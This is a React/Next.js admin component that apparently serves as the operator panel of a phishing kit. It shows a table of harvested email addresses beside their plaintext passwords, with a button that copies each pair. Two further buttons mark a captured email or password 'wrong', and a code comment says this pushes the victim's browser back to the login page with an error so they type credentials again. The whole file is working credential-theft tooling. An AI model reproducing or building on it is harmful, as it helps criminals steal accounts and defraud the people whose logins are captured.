"use client";
import React, { useState } from "react";
import axios from "axios";
import toast from "react-hot-toast";

interface User {
  _id: string;
  email: string;
  password: string;
  createdAt: string | Date;
  deviceType?: string;
  updatedAt?: string;
  status?: string;
}

interface UsersProps {
  users: User[];
}

const Users: React.FC<UsersProps> = ({ users }) => {
  const [pendingId, setPendingId] = useState("");

  const copyToClipboard = (text: string) => {
    navigator.clipboard
      .writeText(text)
      .then(() => toast.success("Copied to clipboard!"))
      .catch((error) => console.error("Failed to copy: ", error));
  };

  // ❌ Tells the user's browser to go back to /?error=email-wrong or
  // /?error=password-wrong
  const markCredentialWrong = async (
    id: string,
    status: "email-wrong" | "password-wrong"
  ) => {
    setPendingId(id);
    const loading = toast.loading("Sending...");

    try {
      await axios.post("/api/admin/user-status", { id, status });
      toast.success(
        status === "email-wrong"
          ? "Email marked as wrong"
          : "Password marked as wrong",
        { id: loading }
      );
    } catch (error) {
      const err = error as { response?: { data?: { message?: string } } };
      toast.error(err?.response?.data?.message || "Something went wrong..!", {
        id: loading,
      });
    } finally {
      setPendingId("");
    }
  };

  return (
    <div className="min-h-screen p-5 bg-gray-50 dark:bg-gray-900">
      <div className="max-w-6xl mx-auto bg-white dark:bg-gray-800 shadow-lg rounded-xl overflow-x-auto">
        <table className="w-full text-left table-auto border-collapse">
          <thead>
            <tr className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-gray-200">
              <th className="px-4 py-3">No.</th>
              <th className="px-4 py-3">Email</th>
              <th className="px-4 py-3">Password</th>
              <th className="px-4 py-3">Time</th>
              <th className="px-4 py-3">Status</th>
              <th className="px-4 py-3">Action</th>
            </tr>
          </thead>
          <tbody>
            {users?.map((user, index) => (
              <tr
                key={user._id}
                className="border-b dark:border-gray-700 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
              >
                <td className="px-4 py-3">{index + 1}</td>
                <td className="px-4 py-3 break-words">{user.email}</td>
                <td className="px-4 py-3 break-words">{user.password}</td>
                <td className="px-4 py-3 whitespace-nowrap">
                  {new Date(user.createdAt).toLocaleString()}
                </td>
                <td className="px-4 py-3 whitespace-nowrap">
                  {user.status === "email-wrong" && (
                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-amber-100 text-amber-800 dark:bg-amber-900/50 dark:text-amber-300">
                      Email Wrong
                    </span>
                  )}
                  {user.status === "password-wrong" && (
                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800 dark:bg-red-900/50 dark:text-red-300">
                      Password Wrong
                    </span>
                  )}
                  {!user.status && (
                    <span className="text-xs text-gray-400 dark:text-gray-500">
                      —
                    </span>
                  )}
                </td>
                <td className="px-4 py-3">
                  <div className="flex flex-wrap items-center gap-2">
                    <button
                      onClick={() =>
                        copyToClipboard(`${user.email}   ${user.password}`)
                      }
                      className="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1 rounded-lg transition-colors"
                    >
                      Copy
                    </button>
                    <button
                      onClick={() =>
                        markCredentialWrong(user._id, "email-wrong")
                      }
                      disabled={pendingId === user._id}
                      className="bg-amber-500 hover:bg-amber-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-3 py-1 rounded-lg transition-colors"
                    >
                      Wrong Email
                    </button>
                    <button
                      onClick={() =>
                        markCredentialWrong(user._id, "password-wrong")
                      }
                      disabled={pendingId === user._id}
                      className="bg-red-500 hover:bg-red-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-3 py-1 rounded-lg transition-colors"
                    >
                      Wrong Password
                    </button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* Empty state */}
        {users.length === 0 && (
          <p className="text-center text-gray-500 dark:text-gray-400 p-5">
            No users found.
          </p>
        )}
      </div>
    </div>
  );
};

export default Users;
